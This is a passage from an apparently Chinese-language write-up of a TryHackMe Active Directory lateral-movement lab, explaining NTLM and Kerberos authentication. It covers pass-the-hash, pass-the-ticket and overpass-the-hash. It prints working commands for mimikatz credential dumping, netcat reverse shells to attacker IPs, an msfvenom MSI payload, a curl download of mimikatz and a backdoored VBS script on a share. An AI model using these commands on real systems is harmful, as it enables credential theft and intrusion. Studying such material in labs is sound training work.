</span><span style="color: #98C379">LHOST=</span><span style="color: #D19A66">10.50</span><span style="color: #98C379">.46.241</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">msi</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">myinstaller88.msi</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 传 MSI 马</span></span><span class="line"><span style="color: #61AFEF">smbclient</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-c</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;put myinstaller88.msi&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-U</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">t1_corine.waters</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-W</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ZA</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;//thmiis.za.tryhackme.com/admin$/&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Korine.1994</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 创建好 handler</span></span><span class="line"><span style="color: #61AFEF">msfconsole</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-q</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 配好 WMI session</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 注意我这里用的 Wsman 协议 官方 WP 是 DCOM</span></span><span class="line"><span style="color: #E06C75">$username</span><span style="color: #ABB2BF"> = </span><span style="color: #98C379">&#39;t1_corine.waters&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">$password</span><span style="color: #ABB2BF"> = </span><span style="color: #98C379">&#39;Korine.1994&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">$securePassword</span><span style="color: #ABB2BF"> = ConvertTo-SecureString </span><span style="color: #E06C75">$password</span><span style="color: #ABB2BF"> -AsPlainText -Force;</span></span><span class="line"><span style="color: #E06C75">$credential</span><span style="color: #ABB2BF"> = New-Object System.Management.Automation.PSCredential </span><span style="color: #E06C75">$username</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$securePassword</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">$Opt</span><span style="color: #ABB2BF"> = New-CimSessionOption -Protocol Wsman</span></span><span class="line"><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential </span><span style="color: #E06C75">$credential</span><span style="color: #ABB2BF"> -SessionOption </span><span style="color: #E06C75">$Opt</span><span style="color: #ABB2BF"> -ErrorAction Stop</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 执行 WMI 触发 payload</span></span><span class="line"><span style="color: #61AFEF">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-CimSession</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-ClassName</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Win32_Product</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-MethodName</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Install</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-Arguments</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">@{PackageLocation</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;C:\Windows\myinstaller88.msi&quot;</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Options</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">AllUsers</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$false</span><span style="color: #98C379">}</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这关也很奇怪，只能跟着 WP 来</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 自己的解法都拿不到 Flag</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 执行 Flag.exe</span></span><span class="line"><span style="color: #61AFEF">C:\Users\t1_corine.waters\Desktop\Flag.exe</span></span></code></pre></div></div></figure><h2 id="使用替代身份验证材料"><a href="#使用替代身份验证材料" class="headerlink" title="使用替代身份验证材料"></a>使用替代身份验证材料</h2><p>标题的这个材料指的是在不知道用户密码的情况下，可以用来访问 Windows 账户的任何数据，这是由于 Windows 认证机制导致的，有以下两种认证机制。</p><ul><li>NTLM authentication</li><li>Kerberos authentication</li></ul><h3 id="NTLM-Authentication"><a href="#NTLM-Authentication" class="headerlink" title="NTLM Authentication"></a>NTLM Authentication</h3><p>整个过程简单说就是服务器发一个 Challenge ，客户端通过自己的 Hash 值和发过来的 Challenge 产生一个 Response 发给服务器。服务器把收到的 Response 和产生的 Challenge 发给 DC，DC 那边存着用户的 NTML Hash，就再走一遍产生 Response 流程，看看产生的 Response 是不是和服务器发过来的一样，如果一样，就通过，不一样拒绝认证。</p><p>不过上述过程是域账户的过程，如果用的本地账户，在服务器本地就能验证这个 Response 了（因为存着账户的凭据）。</p><h3 id="Pass-the-Hash-传递-Hash"><a href="#Pass-the-Hash-传递-Hash" class="headerlink" title="Pass-the-Hash 传递 Hash"></a>Pass-the-Hash 传递 Hash</h3><p>通过使用 mimikatz 或类似工具从获得管理权限的主机中提取凭证后，我们可能会得到明文密码或哈希值，这些密码或哈希值很容易被破解。不过，如果我们不够幸运，最终得到的 NTLM 密码哈希值也不会被破解。</p><p>虽然看起来我们无法真正使用这些哈希值，但只需知道密码哈希值，就能回应身份验证过程中发送的 NTLM 挑战。这意味着我们无需知道明文密码即可进行身份验证。如果 Windows 域配置为使用 NTLM 身份验证，我们就可以通过哈希值（PtH）成功进行身份验证，而不必破解 NTLM 哈希值。</p><p>要提取 NTLM 哈希值，我们可以使用 mimikatz 读取本地 SAM，或者直接从 LSASS 内存中提取哈希值。</p><p>以下命令都是在 mimikatz 工具里面执行的，记得提前传到机器里面。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 从本地 SAM 文件中提取 NTLM hash</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 只能提取本地用户的 NTLM Hash</span></span><span class="line"><span style="color: #ABB2BF">privilege::debug</span></span><span class="line"><span style="color: #ABB2BF">token::elevate</span></span><span class="line"><span style="color: #ABB2BF">lsadump::sam</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 从 LSASS 内存中提取 NTLM hash</span></span><span class="line"><span style="color: #ABB2BF">privilege::debug</span></span><span class="line"><span style="color: #ABB2BF">token::elevate</span></span><span class="line"><span style="color: #ABB2BF">sekurlsa::msv</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 通过 hash 去注入反向 shell</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># PTH 需要在非管理员令牌的上下文中才能成功注入哈希并执行命令</span></span><span class="line"><span style="color: #ABB2BF">token::revert</span></span><span class="line"><span style="color: #ABB2BF">sekurlsa::pth </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:bob.jenkins </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:</span><span style="color: #56B6C2">za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">ntlm:6b4a57f67805a663c818106dc0648484 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">run:</span><span style="color: #98C379">&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555&quot;</span></span></code></pre></div></div></figure><h4 id="Passing-the-Hash-Using-Linux"><a href="#Passing-the-Hash-Using-Linux" class="headerlink" title="Passing the Hash Using Linux"></a>Passing the Hash Using Linux</h4><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># Connect to RDP using PtH</span></span><span class="line"><span style="color: #61AFEF">xfreerdp3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/v:10.200.48.201</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/u:za.tryhackme.com</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">t1_toby.beck</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/pth:533f1bd576caa912bdb9da284bbc60fe</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># Connect via psexec using PtH</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># Note: Only the linux version of psexec support PtH.</span></span><span class="line"><span style="color: #61AFEF">psexec.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-hashes</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">NTLM_HASH</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">DOMAIN/MyUser@VICTIM_IP</span></span></code></pre></div></div></figure><p>Connect to WinRM using PtH:</p><figure class="shiki shell-session"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre><code>evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH</code></pre></div></div></figure><h2 id="Kerberos-认证"><a href="#Kerberos-认证" class="headerlink" title="Kerberos 认证"></a>Kerberos 认证</h2><h3 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h3><ol><li><p>用户<strong>明文发送他的用户名</strong>和用它密码的 Hash 加密过的 timestamp 发送到 **Key Distribution Center (KDC)**。</p><p>KDC 会创建一个 <strong>Ticket Granting Ticket (TGT)</strong> 发送回来，他允许用户使用这个 ticket 去向 KDC <strong>请求访问其他服务的 ticket</strong>，而不用传递他们的用户凭证。随着 TGT 发送的还有一个 Session Key，用户需要用它去生成后续的请求。</p><p>注意这个 TGT 是用 krbtgt 账户的密码 Hash 加密的，所以用户不能访问里面的内容。但加密的 TGT 里面<strong>带一份 Session Key</strong>，所以 KDC 不需要存储 Session Key ，因为他可以从 TGT 里面恢复出来。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/855d6fa3ea4076164934a2ba9717ffb5.png" alt="Kerberos get TGT" data-caption="Kerberos get TGT" loading="lazy"></p></li><li><p>当用户想要访问网络上的服务时，例如共享文件夹、网站或数据库，他们会使用TGT 向 KDC 请求 **TGS (Ticket Granting Service)**。TGS 是一种仅允许连接到为其创建的特定服务的 ticket。为了请求 TGS，用户会发送他们的 <strong>Session Key</strong> 加密的 用户名和 timestamp，作为 Authenticator。还有 <strong>TGT</strong> 和 **Service Principal Name (SPN)**。这个 SPN 标识了我们打算访问的服务和服务器名称。</p><p>KDC 会向我们发送一个 TGS 和一个用 <strong>Session Key</strong> 加密的 Service Session Key，我们需要用这两个密钥来验证我们要访问的服务。TGS 会用服务所有者的 Hash 进行加密，然后这个 TGS 也跟 TGT 类似，会带一份 Service Session Key，服务所有者可以用他自己的 Hash 来解密。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0db01f1f1434f33fa8fb11de2bd165a6.png" alt="Kerberos get TGS" data-caption="Kerberos get TGS" loading="lazy"></p></li><li><p>然后可以将TGS发送到所需的服务以进行身份验证和建立连接。该服务将使用其配置的帐户的密码哈希解密TGS并验证服务会话密钥。</p><p>解释一下：发送的 Username 和 Timestamp 构成的 <code>Authenticator</code> 是用 Service Session Key 加密的，服务可以用它自己的 Hash 从 TGS 解密出 Service Session Key，然后就可以来解密客户端发来的 <code>Authenticator</code>。</p><p>整个过程中，只有在请求 TGT 的时候，用户名没有加密，只加密 timestamp，其他的过程中都是把用户名和 timestamp 一起构成 <code>Authenticator</code> 。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d45b999328017c22b0f249069a88767.png" alt="Kerberos authenticate" data-caption="Kerberos authenticate" loading="lazy"></p></li></ol><h4 id="认证过程简述"><a href="#认证过程简述" class="headerlink" title="认证过程简述"></a>认证过程简述</h4><p><strong>1. AS (Authentication Service) 认证阶段</strong></p><ul><li><strong>用户</strong>向 <strong>KDC</strong> 发送一个<strong>明文</strong>请求，其中包含他们的<strong>用户名</strong>和想要访问的**服务主体名称 (SPN)**，这个 SPN 在第一步是固定的，就是 <code>krbtgt</code>。</li><li><strong>KDC</strong> 收到请求后，会查找该用户账户的密码哈希。它使用这个哈希来解密请求中的时间戳，如果解密成功，就验证了用户的身份。</li><li><strong>KDC</strong> 随后会生成一个**客户端会话密钥 (Client Session Key)**，并用这个密钥来加密时间戳。</li><li><strong>KDC</strong> 最后会用 <code>krbtgt</code> 账户的密码哈希加密一个 <strong>TGT</strong> (Ticket Granting Ticket)。这个 TGT 包含了<strong>客户端会话密钥</strong>、用户信息、有效时间等内容。</li><li><strong>KDC</strong> 将加密的 TGT 和用用户密码哈希加密过的<strong>客户端会话密钥</strong>发送给用户。</li><li><strong>用户</strong>收到后，用自己的密码哈希解密出<strong>客户端会话密钥</strong>，并保存它，但无法解密 TGT。</li></ul><p><strong>2. TGS (Ticket Granting Service) 认证阶段</strong></p><ul><li><strong>用户</strong>现在想要访问其他服务。他们使用自己保存的<strong>客户端会话密钥</strong>来生成一个 <strong>Authenticator</strong>，这是一个动态生成的结构，包含用户名和时间戳等信息。</li><li><strong>用户</strong>将这个加密的 <strong>Authenticator</strong> 和之前收到的 <strong>TGT</strong> (未解密) 以及想要访问服务的 <strong>SPN</strong> 一起发送给 KDC。</li><li><strong>KDC</strong> 收到后，用 <code>krbtgt</code> 账户的密码哈希解密 TGT，从而提取出<strong>客户端会话密钥</strong>。</li><li><strong>KDC</strong> 再用这个<strong>客户端会话密钥</strong>去解密 Authenticator。如果成功，就验证了用户是 TGT 的合法持有者。</li><li><strong>KDC</strong> 随后会生成一个**服务会话密钥 (Service Session Key)**。</li><li><strong>KDC</strong> 创建一个 <strong>TGS</strong> (Ticket Granting Service)，其中包含了<strong>服务会话密钥</strong>、用户信息和时间戳。这个 TGS 会用<strong>服务账户的密码哈希</strong>进行加密。</li><li><strong>KDC</strong> 将加密的 TGS 和用<strong>客户端会话密钥</strong>加密过的<strong>服务会话密钥</strong>发送给用户。</li><li><strong>用户</strong>收到后，用自己的<strong>客户端会话密钥</strong>解密出<strong>服务会话密钥</strong>，并保存它。</li></ul><p><strong>3. 服务验证阶段</strong></p><ul><li><strong>用户</strong>现在拥有了 TGS 和<strong>服务会话密钥</strong>。</li><li><strong>用户</strong>会生成另一个用<strong>服务会话密钥</strong>加密的 Authenticator，并与 TGS 一起发送给目标服务。</li><li><strong>服务</strong>收到后，使用自己账户的密码哈希解密 TGS，成功后就拿到了<strong>服务会话密钥</strong>。</li><li><strong>服务</strong>再用这个<strong>服务会话密钥</strong>去解密用户发送的 Authenticator。</li><li>如果所有验证都通过，服务就会确认用户身份合法，并允许访问。</li></ul><h3 id="Pass-the-Ticket-传递票据"><a href="#Pass-the-Ticket-传递票据" class="headerlink" title="Pass-the-Ticket 传递票据"></a>Pass-the-Ticket 传递票据</h3><p>有些时候我们可以用 mimikatz 从 LSASS 内存中提取 Kerberos ticket 和 session keys，这个过程需要我们拥有 SYSTEM 权限，命令如下</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 下载 mimikatz</span></span><span class="line"><span style="color: #E06C75">curl</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">o</span><span style="color: #ABB2BF"> mimikatz.exe http://</span><span style="color: #D19A66">10.50.46.241</span><span style="color: #ABB2BF">/mimikatz.exe</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 提取 Ticket</span></span><span class="line"><span style="color: #ABB2BF">privilege::debug</span></span><span class="line"><span style="color: #ABB2BF">sekurlsa::</span><span style="color: #E06C75">tickets</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">export</span></span></code></pre></div></div></figure><p>如果我们只能访问 ticket，而不能访问 session key，那么这个 ticket 就没用。参考前面的认证过程，发送的 username 和 timestamp 要用 session key 进行加密构成 <strong>Authenticator</strong>。</p><p>虽然 mimikatz 可以从 LSASS 进程的内存中提取任何可用的 TGT 或 TGS，但大多数时候，我们会对 TGT 感兴趣，因为它们可以用来请求访问允许用户访问的任何服务。同时，TGS 只适用于特定服务。提取 TGT 需要管理员凭证，而提取 TGS 则可以使用低权限账户（仅分配给该账户的权限）。</p><p>提取出所需的 ticket 后，我们就可以使用以下命令将 ticket 注入当前会话：</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">kerberos::ptt [</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;427fcd5]</span><span style="color: #D19A66">-2-0-40e10000</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">Administrator</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75">krbtgt</span><span style="color: #ABB2BF">-ZA.TRYHACKME.COM.kirbi</span></span></code></pre></div></div></figure><p>在我们自己的会话中注入票据不需要管理员权限。之后，我们使用的任何横向移动工具都可以使用这些票据。要检查是否正确注入了票据，可以使用 klist 命令。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">za</span><span style="color: #ABB2BF">\bob.jenkins@THMJMP2 C:\&gt;</span><span style="color: #E06C75"> klist</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">Current LogonId is </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">0x1e43562</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">Cached Tickets: (</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">#</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">     Client</span><span style="color: #ABB2BF">: Administrator @ ZA.TRYHACKME.COM</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Server</span><span style="color: #ABB2BF">: </span><span style="color: #E06C75">krbtgt</span><span style="color: #ABB2BF">/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM</span></span><span class="line"><span style="color: #ABB2BF">        KerbTicket Encryption Type: </span><span style="color: #E06C75">AES</span><span style="color: #D19A66">-256</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">CTS</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">HMAC</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">SHA1</span><span style="color: #D19A66">-96</span></span><span class="line"><span style="color: #ABB2BF">        Ticket Flags </span><span style="color: #D19A66">0x40e10000</span><span style="color: #ABB2BF"> -&gt;</span><span style="color: #E06C75"> forwardable</span><span style="color: #ABB2BF"> renewable initial pre_authent name_canonicalize</span></span><span class="line"><span style="color: #ABB2BF">        Start </span><span style="color: #56B6C2">Time</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">4</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">12</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">2022</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">28</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">35</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">local</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #56B6C2">End</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Time</span><span style="color: #ABB2BF">:   </span><span style="color: #D19A66">4</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">12</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">2022</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">28</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">35</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">local</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">        Renew </span><span style="color: #56B6C2">Time</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">4</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">23</span><span style="color: #ABB2BF">/</span><span style="color: #D19A66">2022</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">28</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">35</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">local</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Session</span><span style="color: #ABB2BF"> Key Type: </span><span style="color: #E06C75">AES</span><span style="color: #D19A66">-256</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">CTS</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">HMAC</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">SHA1</span><span style="color: #D19A66">-96</span></span><span class="line"><span style="color: #ABB2BF">        Cache Flags: </span><span style="color: #D19A66">0x1</span><span style="color: #ABB2BF"> -&gt;</span><span style="color: #E06C75"> PRIMARY</span></span><span class="line"><span style="color: #ABB2BF">        Kdc Called: THMDC.za.tryhackme.com</span></span></code></pre></div></div></figure><h3 id="Overpass-the-hash-Pass-the-Key"><a href="#Overpass-the-hash-Pass-the-Key" class="headerlink" title="Overpass-the-hash &#x2F; Pass-the-Key"></a>Overpass-the-hash &#x2F; Pass-the-Key</h3><p>这种攻击类型类似于 PtH，但他是作用在 Kerberos 上的。</p><p>当用户请求 TGT 时，他们会发送一个时间戳，该时间戳使用从密码中提取的加密密钥加密。根据安装的 Windows 版本和 Kerberos 配置，用于生成该密钥的算法可以是 DES（当前 Windows 版本默认禁用）、RC4、AES128 或 AES256。如果我们拥有这些密钥中的任何一个，就可以向 KDC 申请 TGT，而不需要实际密码，因此被称为 **Pass-the-key (PtK)**。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 提取 Hash</span></span><span class="line"><span style="color: #61AFEF">privilege::debug</span></span><span class="line"><span style="color: #61AFEF">sekurlsa::ekeys</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 弹一个目标用户权限的 Shell</span></span><span class="line"><span style="color: #61AFEF">sekurlsa::pth</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/user:t1_toby.beck</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/domain:za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/rc4:533f1bd576caa912bdb9da284bbc60fe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/run:&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.241 5556&quot;</span></span></code></pre></div></div></figure><p>请注意，使用 RC4 时，密钥等于用户的 NTLM 哈希值。这意味着，如果我们能提取 NTLM 哈希值，只要 RC4 是启用的协议之一，我们就能用它来请求 TGT。这种特殊的变种通常被称为  **Overpass-the-Hash (OPtH)**。</p><h3 id="实践-2"><a href="#实践-2" class="headerlink" title="实践"></a>实践</h3><p>房间的意思应该是我们看能不能提取 <code>t1_toby.beck</code> 的 Hash，然后用这个 Hash 去生成 TGT。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 提取 Hash</span></span><span class="line"><span style="color: #61AFEF">privilege::debug</span></span><span class="line"><span style="color: #61AFEF">sekurlsa::ekeys</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 用 Hash 生成一个有目标用户权限的 Shell</span></span><span class="line"><span style="color: #61AFEF">sekurlsa::pth</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/user:t1_toby.beck</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/domain:za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/rc4:533f1bd576caa912bdb9da284bbc60fe</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/run:&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.241 5001&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 拿到目标机器上的 Shell</span></span><span class="line"><span style="color: #61AFEF">winrs.exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-r:THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">cmd</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 直接执行 Flag.exe</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这里用 -i 能连上，但是可能是两层 Shell 的原因，命令不回显</span></span><span class="line"><span style="color: #61AFEF">psexec64.exe</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\\</span><span style="color: #98C379">THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">C:</span><span style="color: #56B6C2">\U</span><span style="color: #98C379">sers</span><span style="color: #56B6C2">\t</span><span style="color: #98C379">1_toby.beck</span><span style="color: #56B6C2">\D</span><span style="color: #98C379">esktop</span><span style="color: #56B6C2">\F</span><span style="color: #98C379">lag.exe</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这种方式不知道为什么执行 Flag 拿不到</span></span><span class="line"><span style="color: #61AFEF">python3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">psexec.py</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">t1_toby.beck@THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-hashes</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">:533f1bd576caa912bdb9da284bbc60fe</span></span></code></pre></div></div></figure><h2 id="滥用用户行为"><a href="#滥用用户行为" class="headerlink" title="滥用用户行为"></a>滥用用户行为</h2><p>在某些情况下，攻击者可以利用用户执行的操作进一步访问网络中的机器。</p><h3 id="滥用可写共享"><a href="#滥用可写共享" class="headerlink" title="滥用可写共享"></a>滥用可写共享</h3><p>托管在网络共享上的脚本或可执行文件的快捷方式，当用户执行这个快捷方式，可执行文件将从服务器复制到 <code>%temp%</code> 文件夹，并在工作站上执行。</p><h4 id="后门-VBS-脚本"><a href="#后门-VBS-脚本" class="headerlink" title="后门 VBS 脚本"></a>后门 VBS 脚本</h4><figure class="shiki vbscript"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre><code>CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True</code></pre></div></div></figure><h4 id="后门-EXE-程序"><a href="#后门-EXE-程序" class="headerlink" title="后门 EXE 程序"></a>后门 EXE 程序</h4><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">x64</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--platform</span><span style="color: #ABB2BF"> 